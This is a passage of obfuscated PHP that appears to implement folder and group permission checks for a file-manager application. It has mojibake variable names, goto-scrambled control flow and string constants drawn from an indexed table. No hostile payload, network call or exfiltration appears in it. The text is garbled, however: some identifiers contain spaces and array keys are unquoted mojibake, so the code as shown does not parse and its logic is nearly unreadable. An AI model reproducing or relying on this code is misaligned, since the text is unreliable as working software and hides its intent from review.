$aØ°÷à…îÓ = $Bº÷”‡»ß¤[$D³ŸÀ´’ Œ[373]]; if (isset($eà…äÈÚ¥[$aØ°÷à…îÓ])) { $Bº÷”‡»ß¤[$D³ŸÀ´’ Œ[2285]][] = $eà…äÈÚ¥[$aØ°÷à…îÓ][0]; $eà…äÈÚ¥[$aØ°÷à…îÓ] = !1; } } $eà…äÈÚ¥ = array_filter(array_values($eà…äÈÚ¥)); $DøÂ–„ª¼ï = array_merge($eà…äÈÚ¥, $DøÂ–„ª¼ï); goto DÖ¤õ°åÚ; DÖ¤õ°åÚ: return $DøÂ–„ª¼ï; goto A¾³ËÁÑ½ğ; A¾³ËÁÑ½ğ: } public function setAllChildrenByUser($Fõ«Î‡ºÎï, $E˜ËßØóÉ, $AíìšÀéË) { $C·¹•ÚÇˆ =& $_SERVER[…Ò×–]; $B†ŒÔÙÏ‰ = $this->getAllChildrenByUser($Fõ«Î‡ºÎï, $E˜ËßØóÉ); if (!$AíìšÀéË || !$B†ŒÔÙÏ‰) { return !1; } foreach ($B†ŒÔÙÏ‰ as $e»Ş”éº´ˆ) { $Fß÷îß”¿ = array(); foreach ($e»Ş”éº´ˆ[$C·¹•ÚÇˆ[2285]] as $E…ºƒ£ã®³) { $E¡Š¶à‰®Œ = $E…ºƒ£ã®³[$C·¹•ÚÇˆ[422]]; $e¢Ï•œá‘ = $E…ºƒ£ã®³[$C·¹•ÚÇˆ[1450]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Eôö…·¡Á‹ = $E…ºƒ£ã®³[$C·¹•ÚÇˆ[1450]] ? $E…ºƒ£ã®³[$C·¹•ÚÇˆ[1450]] : $E…ºƒ£ã®³[$C·¹•ÚÇˆ[2119]]; if ($E…ºƒ£ã®³[$C·¹•ÚÇˆ[1450]] && $E…ºƒ£ã®³[$C·¹•ÚÇˆ[1450]] == $E˜ËßØóÉ) { continue; } $Fß÷îß”¿[] = array($C·¹•ÚÇˆ[373] => $e»Ş”éº´ˆ[$C·¹•ÚÇˆ[373]], $C·¹•ÚÇˆ[375] => $e¢Ï•œá‘, $C·¹•ÚÇˆ[461] => intval($Eôö…·¡Á‹), $C·¹•ÚÇˆ[2263] => isset($E¡Š¶à‰®Œ[$C·¹•ÚÇˆ[371]]) ? intval($E¡Š¶à‰®Œ[$C·¹•ÚÇˆ[371]]) : 0, $C·¹•ÚÇˆ[2264] => isset($E¡Š¶à‰®Œ[$C·¹•ÚÇˆ[2264]]) ? intval($E¡Š¶à‰®Œ[$C·¹•ÚÇˆ[2264]]) : -1); } $Fß÷îß”¿[] = array($C·¹•ÚÇˆ[373] => $e»Ş”éº´ˆ[$C·¹•ÚÇˆ[373]], $C·¹•ÚÇˆ[375] => SourceModel::TYPE_USER, $C·¹•ÚÇˆ[461] => intval($E˜ËßØóÉ), $C·¹•ÚÇˆ[2263] => intval($AíìšÀéË), $C·¹•ÚÇˆ[2264] => -1); $this->where(array($C·¹•ÚÇˆ[387] => $e»Ş”éº´ˆ[$C·¹•ÚÇˆ[373]]))->delete(); $this->addAll($Fß÷îß”¿); } return !0; } public function get($dÅïŞÆì¢·) { $eâØÅ”Øà = $this->getSourceList(array($dÅïŞÆì¢·), !0); return $eâØÅ”Øà[0]; } public function getSourceList($cˆò¬™µÂï, $E¤×ˆ§¼ÂÇ = false, $C¡„ä¤¥· = false) { goto cÁ«Ùâ÷; aë³à’ÂÆ: $fäï£•ÕÈ = $this->userIsRoot($C¡„ä¤¥·); $E‡ø¡ÜãŠê = AuthModel::authAll(); $Eå­ÅÚåØ° = array($a¶¢É®ùÁ[381] => $E‡ø¡ÜãŠê, $a¶¢É®ùÁ[2291] => array($a¶¢É®ùÁ[389] => 0, $a¶¢É®ùÁ[2125] => $E‡ø¡ÜãŠê, $a¶¢É®ùÁ[390] => LNG($a¶¢É®ùÁ[2292]), $a¶¢É®ùÁ[2139] => $a¶¢É®ùÁ[2293])); goto aª™¦Ò­À„; cÁ«Ùâ÷: $a¶¢É®ùÁ =& $_SERVER[…Ò×–]; if (!$cˆò¬™µÂï) { return array(); } $cé”£ğ‘ó© = Model($a¶¢É®ùÁ[1127]); goto fÀÎºĞÔŞ; fÀÎºĞÔŞ: if (!$E¤×ˆ§¼ÂÇ && count($cˆò¬™µÂï) == 1) { $E¤×ˆ§¼ÂÇ = array(); $E¤×ˆ§¼ÂÇ[$cˆò¬™µÂï[0]] = $cé”£ğ‘ó©->sourceInfo($cˆò¬™µÂï[0]); } if (!$E¤×ˆ§¼ÂÇ) { $aÆš Ç‹ª¼ = array($a¶¢É®ùÁ[387] => array($a¶¢É®ùÁ[388], $cˆò¬™µÂï)); $E¤×ˆ§¼ÂÇ = $cé”£ğ‘ó©->field($a¶¢É®ùÁ[2289])->where($aÆš Ç‹ª¼)->select(); $E¤×ˆ§¼ÂÇ = array_to_keyvalue($E¤×ˆ§¼ÂÇ, $a¶¢É®ùÁ[373]); } $C¦‡”ÜÇ¦Ã = $cˆò¬™µÂï; goto fÖãã‡“ğ; d‹¤õ‡Â‘: $cÛï™Œï­² = array_to_keyvalue_group($cÛï™Œï­², $a¶¢É®ùÁ[373]); $F—İ¶Íˆ† = array(); foreach ($C¦‡”ÜÇ¦Ã as $fòÖà‘òŒ) { if (isset($cÛï™Œï­²[$fòÖà‘òŒ])) { $F—İ¶Íˆ†[$fòÖà‘òŒ] = $cÛï™Œï­²[$fòÖà‘òŒ]; } } goto aë³à’ÂÆ; aª™¦Ò­À„: $Fàã‡Ÿ… = array(); foreach ($E¤×ˆ§¼ÂÇ as $fòÖà‘òŒ => $D•‹…Ğ¹»ì) { if ($fäï£•ÕÈ) { $Fàã‡Ÿ…[$fòÖà‘òŒ] = $Eå­ÅÚåØ°; continue; } $Fàã‡Ÿ…[$fòÖà‘òŒ] = $this->makeSourceAuth($D•‹…Ğ¹»ì, $F—İ¶Íˆ†, $C¡„ä¤¥·); } return $Fàã‡Ÿ…; goto EõÚîĞÖä±; BÓ“´·»ë£: $D¡µößŠî = $a¶¢É®ùÁ[2290]; $aÆš Ç‹ª¼ = array($a¶¢É®ùÁ[387] => array($a¶¢É®ùÁ[388], $C¦‡”ÜÇ¦Ã)); $cÛï™Œï­² = $this->field($D¡µößŠî)->where($aÆš Ç‹ª¼)->select(); goto d‹¤õ‡Â‘; fÖãã‡“ğ: foreach ($E¤×ˆ§¼ÂÇ as $FÃò¦ÉÅ‘é => $BˆÉƒ”õ•) { $c¾ƒ“Ÿáøƒ = $cé”£ğ‘ó©->parentLevelArray($BˆÉƒ”õ•[$a¶¢É®ùÁ[464]]); $C¦‡”ÜÇ¦Ã = array_merge($C¦‡”ÜÇ¦Ã, array($FÃò¦ÉÅ‘é), array_reverse($c¾ƒ“Ÿáøƒ)); } $C¦‡”ÜÇ¦Ã = array_values(array_unique($C¦‡”ÜÇ¦Ã)); if (!$C¦‡”ÜÇ¦Ã) { return array(); } goto BÓ“´·»ë£; EõÚîĞÖä±: } public function authDeepCheck($DêšŠ¥™é, $CÆäöõ²ã = false) { goto A“¿à¸ ÕÍ; A“¿à¸ ÕÍ: $cª ¥Ó§®ñ =& $_SERVER[…Ò×–]; $CÆäöõ²ã = $CÆäöõ²ã ? $CÆäöõ²ã : USER_ID; $aÈ‰ô¥£Æ» = $this->makeAuthDeep($CÆäöõ²ã); goto dİ›È´ğ—ë; aõ§ÌÆĞ: $B®†ŠáÄ± = $F®ùºìÎ£ª ? $F®ùºìÎ£ª[0] : $DêšŠ¥™é; return array($cª ¥Ó§®ñ[381] => -1, $cª ¥Ó§®ñ[422] => array($cª ¥Ó§®ñ[389] => $cª ¥Ó§®ñ[1042], $cª ¥Ó§®ñ[2125] => $cª ¥Ó§®ñ[473], $cª ¥Ó§®ñ[390] => LNG($cª ¥Ó§®ñ[2296]), $cª ¥Ó§®ñ[2139] => $cª ¥Ó§®ñ[2297]), $cª ¥Ó§®ñ[2298] => LNG($cª ¥Ó§®ñ[2299]), $cª ¥Ó§®ñ[2300] => $this->sourceAuthInfo($B®†ŠáÄ±)); goto aœå‘¨„…½; dİ›È´ğ—ë: if (!in_array($DêšŠ¥™é, $aÈ‰ô¥£Æ»[$cª ¥Ó§®ñ[2294]])) { return !1; } $F®ùºìÎ£ª = array(); foreach ($aÈ‰ô¥£Æ»[$cª ¥Ó§®ñ[2295]] as $C­â…ò‡µŠ => $c¦ŒñìË³¢) { if (!in_array($DêšŠ¥™é, $c¦ŒñìË³¢)) { continue; } $F®ùºìÎ£ª[] = $C­â…ò‡µŠ; } goto aõ§ÌÆĞ; aœå‘¨„…½: } protected function makeAuthDeep($dÁ“ÅƒÚ³ = false) { goto dÂ—–Œ…; a¸•Ùì±Š: $f‚êáœå„ä[$dÁ“ÅƒÚ³] = $bÃö¦è­Œİ; return $bÃö¦è­Œİ; goto B…÷ëÅëÒ¢; dÂ—–Œ…: $Eˆæ¡Œ™Áß =& $_SERVER[…Ò×–]; static $f‚êáœå„ä = array(); $dÁ“ÅƒÚ³ = $dÁ“ÅƒÚ³ ? $dÁ“ÅƒÚ³ : USER_ID; goto c…Ñ´ß¿øº; B¼öä††¿·: if ($F…ëÓ‚·ÄÂ) { $Eï‚ƒÊ—¨ = array(array($Eˆæ¡Œ™Áß[375] => SourceModel::TYPE_USER, $Eˆæ¡Œ™Áß[461] => $dÁ“ÅƒÚ³), array($Eˆæ¡Œ™Áß[375] => SourceModel::TYPE_GROUP, $Eˆæ¡Œ™Áß[461] => array($Eˆæ¡Œ™Áß[388], $F…ëÓ‚·ÄÂ)), $Eˆæ¡Œ™Áß[920] => $Eˆæ¡Œ™Áß[2204]); } if ($A äÓã­‰—) { $Eï‚ƒÊ—¨ = array($Eï‚ƒÊ—¨, $Eˆæ¡Œ™Áß[2263] => array($Eˆæ¡Œ™Áß[2302], $A äÓã­‰—)); } $BÂùŠé‹ÈÈ = $this->field($Eˆæ¡Œ™Áß[2303])->where($Eï‚ƒÊ—¨)->select(); goto Féß‰‘ƒî‹; bÎÉ•á£ÌÀ: foreach ($e­”ÚáµâÈ as $EæõË¢–öé) { $CïÄğÇº = $FµÀù¶¸Ò->getInfo($EæõË¢–öé); $EçÚãÅƒ­» = $dìóˆ»®¬->parentLevelArray($CïÄğÇº[$Eˆæ¡Œ™Áß[464]]); $E’ÃÒ§àÒÏ = array_merge($E’ÃÒ§àÒÏ, $EçÚãÅƒ­»); } $E’ÃÒ§àÒÏ = array_values(array_unique($E’ÃÒ§àÒÏ)); foreach ($E’ÃÒ§àÒÏ as $EæõË¢–öé) { $CïÄğÇº = $FµÀù¶¸Ò->getInfo($EæõË¢–öé); $BßËÇÍ¶«Æ[] = $CïÄğÇº[$Eˆæ¡Œ™Áß[395]][$Eˆæ¡Œ™Áß[373]]; $B«¶îÕ„Ùæ[$EæõË¢–öé] = $CïÄğÇº[$Eˆæ¡Œ™Áß[395]][$Eˆæ¡Œ™Áß[373]]; $BŒÃ¤¿¨‡ [$EæõË¢–öé] = $dìóˆ»®¬->parentLevelArray($CïÄğÇº[$Eˆæ¡Œ™Áß[464]]); } goto bë¡İ„ÅÊ; D¾Šîë×‹¨: if ($dÈ»áß‚Ø) { $B¤ßøÇÛÆ = $dìóˆ»®¬->where(array($Eˆæ¡Œ™Áß[373] => array($Eˆæ¡Œ™Áß[388], $dÈ»áß‚Ø)))->select(); foreach ($B¤ßøÇÛÆ as $dìæƒÓÜÑ) { $EçÚãÅƒ­» = $dìóˆ»®¬->parentLevelArray($dìæƒÓÜÑ[$Eˆæ¡Œ™Áß[464]]); $BßËÇÍ¶«Æ = array_merge($BßËÇÍ¶«Æ, $EçÚãÅƒ­»); $E’ÃÒ§àÒÏ[] = $dìæƒÓÜÑ[$Eˆæ¡Œ™Áß[461]]; $eò´°ãÄÚ¬[$dìæƒÓÜÑ[$Eˆæ¡Œ™Áß[373]]] = $EçÚãÅƒ­»; $FÕ±Ö„İ¤[$dìæƒÓÜÑ[$Eˆæ¡Œ™Áß[373]]] = $dìæƒÓÜÑ[$Eˆæ¡Œ™Áß[461]]; } } $E’ÃÒ§àÒÏ = array_values(array_unique($E’ÃÒ§àÒÏ)); $e­”ÚáµâÈ = $E’ÃÒ§àÒÏ; goto bÎÉ•á£ÌÀ; bë¡İ„ÅÊ: foreach ($eò´°ãÄÚ¬ as $cçÛê±¶ÀÃ => $A¹óÍÜäá…) { $AŠ±‚ĞÁ‡¼ = $FÕ±Ö„İ¤[$cçÛê±¶ÀÃ]; if (!$AŠ±‚ĞÁ‡¼ || !$B«¶îÕ„Ùæ[$AŠ±‚ĞÁ‡¼]) { continue; } $Eº®‹ØĞŞé = array(); foreach ($BŒÃ¤¿¨‡ [$AŠ±‚ĞÁ‡¼] as $EæõË¢–öé) { $Eº®‹ØĞŞé[] = $B«¶îÕ„Ùæ[$EæõË¢–öé]; } $eò´°ãÄÚ¬[$cçÛê±¶ÀÃ] = array_merge($Eº®‹ØĞŞé, $A¹óÍÜäá…); } $BßËÇÍ¶«Æ = array_values(array_unique($BßËÇÍ¶«Æ)); $bÃö¦è­Œİ = array($Eˆæ¡Œ™Áß[2294] => $BßËÇÍ¶«Æ, $Eˆæ¡Œ™Áß[2295] => $eò´°ãÄÚ¬); goto a¸•Ùì±Š; Féß‰‘ƒî‹: $dÈ»áß‚Ø = array_to_keyvalue($BÂùŠé‹ÈÈ, $Eˆæ¡Œ™Áß[33], $Eˆæ¡Œ™Áß[373]); $BßËÇÍ¶«Æ = array(); $E’ÃÒ§àÒÏ = $F…ëÓ‚·ÄÂ; goto a°ºÕ‚ò¼; aõ›Ÿåê¾¹: $FÕ±Ö„İ¤ = array(); $B«¶îÕ„Ùæ = array(); $BŒÃ¤¿¨‡  = array(); goto D¾Šîë×‹¨; a°ºÕ‚ò¼: $dìóˆ»®¬ = Model($Eˆæ¡Œ™Áß[1127]); $FµÀù¶¸Ò = Model($Eˆæ¡Œ™Áß[463]); $eò´°ãÄÚ¬ = array(); goto aõ›Ÿåê¾¹; c…Ñ´ß¿øº: if (isset($f‚êáœå„ä[$dÁ“ÅƒÚ³])) { return $f‚êáœå„ä[$dÁ“ÅƒÚ³]; } $BêËÙÆ§´õ = Model($Eˆæ¡Œ™Áß[2301])->listData(); $A äÓã­‰— = array(); goto E½³·Ôàº; E½³·Ôàº: foreach ($BêËÙÆ§´õ as $D¾Ù¢•¨) { if ($D¾Ù¢•¨[$Eˆæ¡Œ™Áß[380]] == 0 && $D¾Ù¢•¨[$Eˆæ¡Œ™Áß[2140]] == $Eˆæ¡Œ™Áß[83]) { $A äÓã­‰—[] = $D¾Ù¢•¨[$Eˆæ¡Œ™Áß[371]]; } } $F…ëÓ‚·ÄÂ = $this->userGroupParents($dÁ“ÅƒÚ³); $Eï‚ƒÊ—¨ = array($Eˆæ¡Œ™Áß[375] => SourceModel::TYPE_USER, $Eˆæ¡Œ™Áß[461] => $dÁ“ÅƒÚ³); goto B¼öä††¿·; B…÷ëÅëÒ¢: } private function makeSourceAuth($cê…±ÑØùš, $e§ù¹–•Ü, $fœ¯Ó™Ã¯÷ = false) { goto e¨Á˜ÖßÚ; cŞ§å–Š™: $f½‰áÑ°Ã = $cê…±ÑØùš[$eŠñ¬é÷š•[375]] == SourceModel::TYPE_GROUP; $c‡”°îÛì‡ = $f½‰áÑ°Ã ? $this->groupRootAuth($fŒ§‹àÎœñ, $fœ¯Ó™Ã¯÷) : !1; if ($c‡”°îÛì‡ && Model($eŠñ¬é÷š•[2282])->authCheckAction($c‡”°îÛì‡[$eŠñ¬é÷š•[380]], $eŠñ¬é÷š•[1574])) { return $this->groupAuthInfo($c‡”°îÛì‡, $fŒ§‹àÎœñ); } goto Açƒº˜¯Ú; aİÒÉ‚Èš: foreach ($E»™Û¡ÂŞé as $f…ğ¦İÊø‰) { if (!isset($e§ù¹–•Ü[$f…ğ¦İÊø‰])) { continue; } $aÊ£Üîš°´ = $this->authMake($e§ù¹–•Ü[$f…ğ¦İÊø‰], $fœ¯Ó™Ã¯÷); if ($aÊ£Üîš°´[$eŠñ¬é÷š•[422]]) { $D»Ç…‹¥“ = $aÊ£Üîš°´; break; } } if (!$f½‰áÑ°Ã) { return $D»Ç…‹¥“; } if (!$D»Ç…‹¥“ && $c‡”°îÛì‡) { $D»Ç…‹¥“ = $this->groupAuthInfo($c‡”°îÛì‡, $fŒ§‹àÎœñ); } goto bÇ¡¤©¼ö£; bÇ¡¤©¼ö£: if (!$D»Ç…‹¥“) { $BÓ¸Ñ†¡…Ò = Model($eŠñ¬é÷š•[463])->getInfo($fŒ§‹àÎœñ); $d»´áœ¶æÃ = explode($eŠñ¬é÷š•[47], trim($BÓ¸Ñ†¡…Ò[$eŠñ¬é÷š•[464]], $eŠñ¬é÷š•[47])); foreach ($d»´áœ¶æÃ as $EØ‹“ë¼Ñ) { if ($EØ‹“ë¼Ñ == $eŠñ¬é÷š•[473] || $EØ‹“ë¼Ñ == $FèŸ¿ŠÀÚŠ) { continue; } $dÃõÕšÀë• = $this->groupRootAuth($EØ‹“ë¼Ñ, $fœ¯Ó™Ã¯÷); if (!$dÃõÕšÀë•) { continue; } $D»Ç…‹¥“ = $this->groupAuthInfo($dÃõÕšÀë•, $EØ‹“ë¼Ñ); break; } } if (!$D»Ç…‹¥“ || $D»Ç…‹¥“[$eŠñ¬é÷š•[381]] <= 0) { $fö‰ß•ÉåÊ = $this->authDeepCheck($cê…±ÑØùš[$eŠñ¬é÷š•[373]], $fœ¯Ó™Ã¯÷); if ($fö‰ß•ÉåÊ) { $D»Ç…‹¥“ = $fö‰ß•ÉåÊ; } } return $D»Ç…‹¥“; goto eÑé‚¼İ; e¨Á˜ÖßÚ: $eŠñ¬é÷š• =& $_SERVER[…Ò×–]; $FèŸ¿ŠÀÚŠ = $eŠñ¬é÷š•[83]; $fŒ§‹àÎœñ = $cê…±ÑØùš[$eŠñ¬é÷š•[461]]; goto cŞ§å–Š™; Açƒº˜¯Ú: $E»™Û¡ÂŞé = Model($eŠñ¬é÷š•[1127])->parentLevelArray($cê…±ÑØùš[$eŠñ¬é÷š•[464]]); $E»™Û¡ÂŞé = array_merge(array($cê…±ÑØùš[$eŠñ¬é÷š•[373]]), array_reverse($E»™Û¡ÂŞé)); $D»Ç…‹¥“ = !1; goto aİÒÉ‚Èš; eÑé‚¼İ: } private function userIsRoot($B¢Ø…¢«Ñö = false) { $CÏ®Ó­„Ñ =& $_SERVER[…Ò×–]; if (!$B¢Ø…¢«Ñö && _get($GLOBALS, $CÏ®Ó­„Ñ[462])) { return !0; } $FÌĞ’‡ƒÛ = Model($CÏ®Ó­„Ñ[482])->getInfo($B¢Ø…¢«Ñö); $Eä“¤é’¨¦ = Model($CÏ®Ó­„Ñ[2304])->listData($FÌĞ’‡ƒÛ[$CÏ®Ó­„Ñ[1333]]); if ($Eä“¤é’¨¦ && $Eä“¤é’¨¦[$CÏ®Ó­„Ñ[1205]][$CÏ®Ó­„Ñ[2305]] == 1) { return !0; } return !1; } private function sourceAuthInfo($d©ğ«¸Œ•©) { goto eã†˜Û“—‚; AÄ•Òë …®: if (isset($AÉïÚÎãë[$FçöÉ×ŞÜ“[469]])) { $F‡±ˆ¥ˆšƒ = explode($FçöÉ×ŞÜ“[8], trim($AÉïÚÎãë[$FçöÉ×ŞÜ“[471]], $FçöÉ×ŞÜ“[8])); array_shift($F‡±ˆ¥ˆšƒ); $fÙËË›ÎÅ = $AÉïÚÎãë[$FçöÉ×ŞÜ“[467]] . $FçöÉ×ŞÜ“[2306] . implode($FçöÉ×ŞÜ“[8], $F‡±ˆ¥ˆšƒ); } return array($FçöÉ×ŞÜ“[390] => $AÉïÚÎãë[$FçöÉ×ŞÜ“[28]], $FçöÉ×ŞÜ“[75] => KodIO::make($AÉïÚÎãë[$FçöÉ×ŞÜ“[373]]), $FçöÉ×ŞÜ“[2307] => $fÙËË›ÎÅ); goto AäªÒ¬äÙ; eã†˜Û“—‚: $FçöÉ×ŞÜ“ =& $_SERVER[…Ò×–]; $aÖĞÉÑÄù÷ = Model($FçöÉ×ŞÜ“[1127]); $AÉïÚÎãë = $aÖĞÉÑÄù÷->sourceInfo($d©ğ«¸Œ•©); goto e°é …Ëƒ‡; e°é …Ëƒ‡: if (!$AÉïÚÎãë) { return !1; } $aÖĞÉÑÄù÷->groupPathDisplay($AÉïÚÎãë); $AÚ°îŸ¦šÂ = array($AÉïÚÎãë); goto CÓæÜò¢ôÔ; CÓæÜò¢ôÔ: $AÚ°îŸ¦šÂ = $aÖĞÉÑÄù÷->_listAppendPath($AÚ°îŸ¦šÂ); $AÉïÚÎãë = $AÚ°îŸ¦šÂ[0]; $fÙËË›ÎÅ = $AÉïÚÎãë[$FçöÉ×ŞÜ“[471]]; goto AÄ•Òë …®; AäªÒ¬äÙ: } private function groupAuthInfo($C‹Ï†öÎñ, $B¶î»›) { $AÚÃ¡íâ¶ =& $_SERVER[…Ò×–]; $dã«Ïö–© = Model($AÚÃ¡íâ¶[463])->getInfo($B¶î»›); return array($AÚÃ¡íâ¶[2308] => intval($C‹Ï†öÎñ[$AÚÃ¡íâ¶[380]]), $AÚÃ¡íâ¶[2291] => $C‹Ï†öÎñ, $AÚÃ¡íâ¶[2309] => LNG($AÚÃ¡íâ¶[2310]), $AÚÃ¡íâ¶[2300] => array($AÚÃ¡íâ¶[390] => $dã«Ïö–©[$AÚÃ¡íâ¶[28]], $AÚÃ¡íâ¶[75] => KodIO::make($dã«Ïö–©[$AÚÃ¡íâ¶[395]][$AÚÃ¡íâ¶[373]]), $AÚÃ¡íâ¶[2307] => $dã«Ïö–©[$AÚÃ¡íâ¶[468]])); } protected function groupRootAuth($Cù—¤Ø¶ò, $c›çÉÊ ´ù = false) { goto fÕÉÅêÓÅê; Bì³Ñ…à: $b­©Á¦†íŠ = array($Dœ‹³ù˜Ù¨[373] => $CÚ†¡ù™Ë£[$Dœ‹³ù˜Ù¨[395]][$Dœ‹³ù˜Ù¨[373]]); $FŠ²ÏŠ»¿­ = $Dœ‹³ù˜Ù¨[2290]; $d¥äøÍ¯Ê— = $this->field($FŠ²ÏŠ»¿­)->cacheMemory()->where($b­©Á¦†íŠ)->select(); goto FŒå³¶ù¶—; f‰ì³áÂç™: static $CƒùÌÀØ = array(); if (isset($CƒùÌÀØ[$BØºÔ„Õ¡])) { return $CƒùÌÀØ[$BØºÔ„Õ¡]; } $CÚ†¡ù™Ë£ = Model($Dœ‹³ù˜Ù¨[463])->getInfo($Cù—¤Ø¶ò); goto D¶ƒ™ìŠÜÇ; fÕÉÅêÓÅê: $Dœ‹³ù˜Ù¨ =& $_SERVER[…Ò×–]; $c›çÉÊ ´ù = $c›çÉÊ ´ù ? $c›çÉÊ ´ù : USER_ID; $BØºÔ„Õ¡ = $c›çÉÊ ´ù . $Dœ‹³ù˜Ù¨[2311] . $Cù—¤Ø¶ò; goto f‰ì³áÂç™; D¶ƒ™ìŠÜÇ: $EÚ‰ù‰êÑ = $this->userGroupList($c›çÉÊ ´ù); $e½›÷æÑ‰– = isset($EÚ‰ù‰êÑ[$Cù—¤Ø¶ò]) ? $EÚ‰ù‰êÑ[$Cù—¤Ø¶ò][$Dœ‹³ù˜Ù¨[380]] : !1; if ($e½›÷æÑ‰– && Model($Dœ‹³ù˜Ù¨[2282])->authCheckAction($e½›÷æÑ‰–[$Dœ‹³ù˜Ù¨[380]], $Dœ‹³ù˜Ù¨[1574])) { $CƒùÌÀØ[$BØºÔ„Õ¡] = $e½›÷æÑ‰–; return $e½›÷æÑ‰–; } goto Bì³Ñ…à; FŒå³¶ù¶—: $D»ŸŒ§ªä = $d¥äøÍ¯Ê— ? $this->authMake($d¥äøÍ¯Ê—, $c›çÉÊ ´ù) : !1; $b…„ãÛ·‘‚ = $D»ŸŒ§ªä ? $D»ŸŒ§ªä[$Dœ‹³ù˜Ù¨[422]] : !1; $CƒùÌÀØ[$BØºÔ„Õ¡] = $b…„ãÛ·‘‚ ? $b…„ãÛ·‘‚ : $e½›÷æÑ‰–; goto b©ß‰„ê§; b©ß‰„ê§: return $CƒùÌÀØ[$BØºÔ„Õ¡]; goto cÛĞ³»ŒĞè; cÛĞ³»ŒĞè: } public function authOwnerApply($eŒÃ’ÍÍ™) { goto AîÙ•“¾…Ü; B¿§¶õ‚¨‰: if (count($Fˆ¤¾êÌß) == 0) { $Fˆ¤¾êÌß = $this->authFolderOwnerGroup($eŒÃ’ÍÍ™[$Eœ¶ÖœÈÖ[461]]); } $Fˆ¤¾êÌß = array_unique($Fˆ¤¾êÌß); if (AuthModel::authCheckRoot($eŒÃ’ÍÍ™[$Eœ¶ÖœÈÖ[380]][$Eœ¶ÖœÈÖ[381]])) { $Fˆ¤¾êÌß[] = USER_ID; } goto cÉäò™­Ò–; cÉäò™­Ò–: $eŒÃ’ÍÍ™[$Eœ¶ÖœÈÖ[380]][$Eœ¶ÖœÈÖ[2314]] = Model($Eœ¶ÖœÈÖ[479])->userListInfo($Fˆ¤¾êÌß); return $eŒÃ’ÍÍ™; goto D˜ä¼ëéŠœ; dÖÑ†ğ¢ğ†: $câÜÙšÎ˜» = array(); $Fˆ¤¾êÌß = array(); foreach ($eò£­‰˜Ø as $AŠŠ‡‰–÷× => $a»à•†¾áŞ) { $a˜ÈÖ×ï™ = $this->authFolderOwnerUser($a»à•†¾áŞ); $câÜÙšÎ˜»[$AŠŠ‡‰–÷×] = $a˜ÈÖ×ï™; $Fˆ¤¾êÌß = array_merge($Fˆ¤¾êÌß, $a˜ÈÖ×ï™[$Eœ¶ÖœÈÖ[539]]); if ($a˜ÈÖ×ï™[$Eœ¶ÖœÈÖ[2313]]) { break; } } goto B¿§¶õ‚¨‰; AîÙ•“¾…Ü: $Eœ¶ÖœÈÖ =& $_SERVER[…Ò×–]; if (empty($eŒÃ’ÍÍ™[$Eœ¶ÖœÈÖ[380]]) || isset($eŒÃ’ÍÍ™[$Eœ¶ÖœÈÖ[2312]]) && $eŒÃ’ÍÍ™[$Eœ¶ÖœÈÖ[2312]]) { return $eŒÃ’ÍÍ™; } if (AuthModel::authCheckRoot($eŒÃ’ÍÍ™[$Eœ¶ÖœÈÖ[380]][$Eœ¶ÖœÈÖ[381]])) { return $eŒÃ’ÍÍ™; } goto a™ôïï¦¬­; Dº‘„º“Ë: $Fˆİ½Æ»õ¡ = array($Eœ¶ÖœÈÖ[387] => array($Eœ¶ÖœÈÖ[388], $EŒò„ŒĞéƒ)); $eò£­‰˜Ø = $this->field($b½Ó†¹ğÏ)->where($Fˆİ½Æ»õ¡)->select(); $eò£­‰˜Ø = array_to_keyvalue_group($eò£­‰˜Ø, $Eœ¶ÖœÈÖ[373]); goto dÖÑ†ğ¢ğ†; a™ôïï¦¬­: $EŒò„ŒĞéƒ = Model($Eœ¶ÖœÈÖ[1127])->parentLevelArray($eŒÃ’ÍÍ™[$Eœ¶ÖœÈÖ[464]]); $EŒò„ŒĞéƒ = array_merge(array($eŒÃ’ÍÍ™[$Eœ¶ÖœÈÖ[373]]), array_reverse($EŒò„ŒĞéƒ)); $b½Ó†¹ğÏ = $Eœ¶ÖœÈÖ[2290]; goto Dº‘„º“Ë; D˜ä¼ëéŠœ: } private function authFolderOwnerGroup($DŠ‚‘‘­§ö) { $CªšŠµåÒ´ =& $_SERVER[…Ò×–]; $Dô”»ÅòÏ• = Model($CªšŠµåÒ´[2198])->where(array($CªšŠµåÒ´[2119] => $DŠ‚‘‘­§ö))->select(); $C„‰¡‚š à = array(); if (!$Dô”»ÅòÏ•) { return $C„‰¡‚š à; } foreach ($Dô”»ÅòÏ• as $B¢ç¥¹×òÀ) { $bƒ‚íùâ¿ = $this->authInfo($B¢ç¥¹×òÀ); if (AuthModel::authCheckRoot($bƒ‚íùâ¿[$CªšŠµåÒ´[380]])) { $C„‰¡‚š à[] = $B¢ç¥¹×òÀ[$CªšŠµåÒ´[1450]]; } } return $C„‰¡‚š à; } private function authFolderOwnerUser($cáÉº×‰Ù) { $a•¸êÒâº =& $_SERVER[…Ò×–]; $c›¿ƒ¯È£ = array(); $CÔÁˆÙ»ĞÊ = !1; foreach ($cáÉº×‰Ù as $Dòä…—¿É©) { $c¿ĞˆÉŸ§¿ = $this->authInfo($Dòä…—¿É©); if ($Dòä…—¿É©[$a•¸êÒâº[461]] == $a•¸êÒâº[473]) { $CÔÁˆÙ»ĞÊ = !0; } if ($Dòä…—¿É©[$a•¸êÒâº[375]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($c¿ĞˆÉŸ§¿[$a•¸êÒâº[380]])) { $c›¿ƒ¯È£[] = $Dòä…—¿É©[$a•¸êÒâº[461]]; } } } return array($a•¸êÒâº[539] => $c›¿ƒ¯È£, $a•¸êÒâº[2313] => $CÔÁˆÙ»ĞÊ); } public function authMake($A¶²¼Í·Œ, $cÉ´µÚÎ´« = false) { goto A…’ç¦¥†ö; eÏÕâ‚æÆö: foreach ($A¶²¼Í·Œ as $Eƒ³Ï²ĞÈ°) { $fƒİ·ªÓ  = $this->authInfo($Eƒ³Ï²ĞÈ°); $c†ÇùŒÆ–× = $Eƒ³Ï²ĞÈ°[$aäÁŒ©†áˆ[461]]; $CÓíƒŒæ‹ = intval($fƒİ·ªÓ [$aäÁŒ©†áˆ[380]]); if ($Eƒ³Ï²ĞÈ°[$aäÁŒ©†áˆ[375]] == SourceModel::TYPE_USER && $c†ÇùŒÆ–× == $cÉ´µÚÎ´«) { $F¤Û…ŠŠ = !0; $fƒäùî£ğŒ = $fƒİ·ªÓ ; $B÷ªÒ´¹ç = $CÓíƒŒæ‹; } else { if ($Eƒ³Ï²ĞÈ°[$aäÁŒ©†áˆ[375]] == SourceModel::TYPE_GROUP && $this->groupContainUser($c†ÇùŒÆ–×, $cÉ´µÚÎ´«)) { $EøÆ×Ñà = !0; 